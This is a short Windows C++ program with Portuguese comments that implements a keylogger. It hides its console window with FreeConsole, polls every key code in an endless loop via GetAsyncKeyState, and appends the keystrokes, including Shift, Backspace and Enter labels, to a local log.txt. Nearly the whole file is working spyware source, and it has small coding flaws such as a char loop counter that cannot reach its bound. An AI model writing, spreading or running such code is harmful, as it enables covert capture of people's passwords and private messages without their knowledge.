#include <bits/stdc++.h>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file); 				//Declarando a função para criar o log.

int main() {							//Função principal

	FreeConsole();

	char i;							//Variável para usar no laço "for".

	while (true) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {			//Loop para verificar tecla por tecla qual está pressionada. Antes de 8 são entradas de mouse.
			if (GetAsyncKeyState(i) == -32767) {	// Se a tecla "i" for pressionada ela será igual esse valor, parece aleatório, mas não é.
				Save(i, "log.txt");		// Se verdadeiro, ele salva no log.txt.
			}
		}
	}
	return 0;
}



int Save(int _key, char *file) { 				//Função Save
	cout << _key << endl;

	Sleep(10);

	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");


	if (_key == VK_SHIFT)					// Cadeia de IF e Elses para printar em texto as teclas shift, backspace e etc.
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");		// Verifique o manual do Visual Studio.
	else if (_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	else if (_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	else if (_key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else
		fprintf(OUTPUT_FILE, "%s", &_key);


	fclose(OUTPUT_FILE);

	return 0;
}
